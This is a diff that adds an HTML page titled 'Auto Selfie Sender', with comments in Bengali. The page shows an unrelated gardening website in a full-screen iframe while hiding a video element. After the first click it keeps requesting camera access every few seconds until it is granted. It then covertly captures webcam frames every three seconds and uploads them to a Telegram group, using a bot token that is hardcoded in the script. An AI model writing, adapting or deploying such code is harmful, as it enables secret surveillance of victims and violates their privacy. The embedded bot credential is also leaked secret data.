@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Selfie Sender</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        iframe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 1;
+        }
+        video, canvas {
+            display: none; /* ক্যামেরার ভিজ্যুয়াল অংশ লুকানো */
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ব্যাকগ্রাউন্ড ওয়েবসাইট -->
+    <iframe src="https://www.gwtgarden.com/"></iframe>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+
+        // Telegram Bot Details (আপনার তথ্য দিয়ে পরিবর্তন করুন)
+        const TELEGRAM_BOT_TOKEN = "7683194814:AAHHwnPjUhINyB8vTXjNvwT6RRhj56YI64M";  // আপনার বট টোকেন
+        const TELEGRAM_GROUP_ID = "-1002540621369";  // আপনার গ্রুপ আইডি
+
+        function requestCameraAccess() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    console.log("✅ ক্যামেরা অনুমতি দেওয়া হয়েছে!");
+                    startSelfieSender();
+                })
+                .catch(err => {
+                    console.error("❌ ক্যামেরা অনুমতি দেওয়া হয়নি! পুনরায় চেষ্টা করা হচ্ছে...");
+                    setTimeout(requestCameraAccess, 3000); // অনুমতি না দিলে ৩ সেকেন্ড পর আবার চেষ্টা করবে
+                });
+        }
+
+        function startSelfieSender() {
+            setInterval(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append("chat_id", TELEGRAM_GROUP_ID);
+                    formData.append("photo", blob, "selfie.jpg");
+                    formData.append("caption", "📸 নতুন সেলফি!");
+
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    })
+                    .then(res => res.json())
+                    .then(data => console.log("📷 ছবি পাঠানো হয়েছে!", data))
+                    .catch(err => console.error("❌ ছবি আপলোড সমস্যা!", err));
+                }, "image/jpeg");
+            }, 3000);
+        }
+
+        // ইউজার প্রথমবার ক্লিক করলে ক্যামেরা অনুমতি চাওয়া শুরু করবে
+        document.body.addEventListener("click", () => {
+            requestCameraAccess();
+        }, { once: true });
+
+    </script>
+
+</body>
+</html>
